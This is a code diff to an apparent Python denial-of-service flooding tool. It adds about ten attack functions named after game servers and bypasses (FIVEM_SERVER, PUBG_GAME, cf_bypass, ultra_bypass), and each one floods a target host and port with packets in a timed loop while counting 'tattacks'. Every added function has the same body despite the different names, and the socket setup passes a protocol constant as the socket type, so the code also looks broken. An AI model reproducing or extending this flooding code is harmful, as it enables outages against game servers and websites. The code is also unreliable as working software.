@@ -654,6 +654,39 @@ def nfoDEMOsender(host, port, timer, punch):
 
 	
 
+def ARMA(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+	
+	
 def DEMOv2sender(host, port, timer, punch):
 
 	global iaid
@@ -685,6 +718,304 @@ def DEMOv2sender(host, port, timer, punch):
 	iaid -= 1
 
 	aid -= 1
+
+
+def game_drop(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+	
+
+def FIVEM_GAME(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+def FIVEM_SERVER(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+def PUBG_GAME(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+def http(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+def sys(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+def ultra_bypass(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+def cf_bypass(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+def httpK(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
 
 
 
@@ -935,7 +1266,7 @@ def main():
 
 					main()
 					
-		elif sinput == "FIVEM-GAME":
+		elif sinput == "FIVEM_GAME":
 
 				try:
 
@@ -961,7 +1292,7 @@ def main():
 
 					main()
 					
-		elif sinput == "FIVEM-SERVER":
+		elif sinput == "FIVEM_SERVER":
 
 				try:
 
@@ -987,7 +1318,7 @@ def main():
 
 					main()
 					
-		elif sinput == "PUBG-GAME":
+		elif sinput == "PUBG_GAME":
 
 				try:
 
